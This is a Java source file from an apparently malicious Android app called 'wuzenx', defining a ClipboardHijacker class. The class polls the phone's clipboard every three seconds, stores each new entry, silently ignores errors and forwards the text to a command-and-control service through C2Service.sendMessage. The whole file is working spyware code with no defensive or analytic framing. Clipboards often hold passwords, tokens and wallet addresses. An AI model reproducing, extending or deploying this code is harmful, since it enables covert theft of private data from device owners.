package com.wuzenx.utils;

import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.content.SharedPreferences;
import android.os.Handler;
import android.os.Looper;

import com.wuzenx.C2Service;

public class ClipboardHijacker {
    private Context context;
    private C2Service c2;
    private Handler handler = new Handler(Looper.getMainLooper());
    private boolean running = false;
    private String lastClip = "";
    private ClipboardManager clipboard;

    public ClipboardHijacker(Context context, C2Service c2) {
        this.context = context;
        this.c2 = c2;
        this.clipboard = (ClipboardManager)
            context.getSystemService(Context.CLIPBOARD_SERVICE);
    }

    public void start() {
        if (running) return;
        running = true;
        SharedPreferences prefs = context.getSharedPreferences("wuzenx", Context.MODE_PRIVATE);
        lastClip = prefs.getString("last_clip", "");
        poll();
    }

    public void stop() {
        running = false;
        handler.removeCallbacksAndMessages(null);
    }

    private void poll() {
        if (!running) return;
        try {
            if (clipboard != null && clipboard.hasPrimaryClip()) {
                ClipData clip = clipboard.getPrimaryClip();
                if (clip != null && clip.getItemCount() > 0) {
                    CharSequence text = clip.getItemAt(0).getText();
                    if (text != null) {
                        String clipText = text.toString();
                        if (!clipText.isEmpty() && !clipText.equals(lastClip)) {
                            lastClip = clipText;
                            SharedPreferences prefs = context.getSharedPreferences(
                                "wuzenx", Context.MODE_PRIVATE);
                            prefs.edit().putString("last_clip", lastClip).apply();

                            if (C2Service.instance != null)
                                C2Service.instance.sendMessage("clipboard", clipText);
                        }
                    }
                }
            }
        } catch (Exception ignored) {}
        handler.postDelayed(this::poll, 3000);
    }
}
